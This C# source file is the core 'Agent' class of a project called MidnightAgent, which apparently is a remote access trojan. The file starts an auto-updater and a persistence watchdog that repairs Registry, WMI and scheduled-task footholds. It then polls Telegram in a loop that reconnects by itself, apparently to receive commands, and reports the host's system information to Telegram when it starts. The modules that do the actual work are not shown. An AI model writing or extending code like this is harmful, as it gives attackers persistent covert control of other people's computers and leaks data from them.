using System;
using System.Threading;
using System.Threading.Tasks;
using MidnightAgent.Telegram;

namespace MidnightAgent.Core
{
    /// <summary>
    /// Main Agent class - orchestrates all components
    /// </summary>
    public class Agent
    {
        private readonly TelegramService _telegram;
        private readonly CancellationTokenSource _cts;
        private bool _running;

        public Agent()
        {
            _telegram = new TelegramService();
            _cts = new CancellationTokenSource();
        }

        /// <summary>
        /// Run the agent (blocking)
        /// </summary>
        public void Run()
        {
            _running = true;
            Logger.Log("============================================");
            Logger.Log("Agent started - beginning main loop");

            // Start Auto Updater
            AutoUpdater.Start(_cts.Token);

            // Start Persistence Watchdog (Registry + WMI + Task repair)
            Persistence.Watchdog.Start(_cts.Token);

            // Start Power Watchdog (Sleep/Wake/Unlock monitoring)
            PowerWatchdog.Start(_telegram);

            // Start polling loop with auto-reconnect
            while (_running)
            {
                try
                {
                    Logger.Log("Starting Telegram polling...");
                    _telegram.StartPolling(_cts.Token);
                }
                catch (OperationCanceledException)
                {
                    Logger.Log("Polling cancelled");
                    break;
                }
                catch (Exception ex)
                {
                    Logger.Log($"Connection error: {ex.Message}");
                    System.Diagnostics.Debug.WriteLine($"Connection error: {ex.Message}");
                    
                    if (_running)
                    {
                        // Wait before reconnecting
                        Thread.Sleep(Config.ReconnectDelay);
                        Logger.Log("Reconnecting...");
                    }
                }
            }
            
            Logger.Log("Agent stopped");
        }

        /// <summary>
        /// Stop the agent
        /// </summary>
        public void Stop()
        {
            _running = false;
            _cts.Cancel();
            PowerWatchdog.Stop();
        }

        /// <summary>
        /// Send online notification (called once from Program.Run)
        /// </summary>
        public void SendOnlineNotificationOnce()
        {
            try
            {
                string message = $"🌙 Agent Online!\n{AgentInfo.GetFullInfo()}";
                _telegram.SendMessage(message);
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Failed to send online notification: {ex.Message}");
            }
        }
    }
}
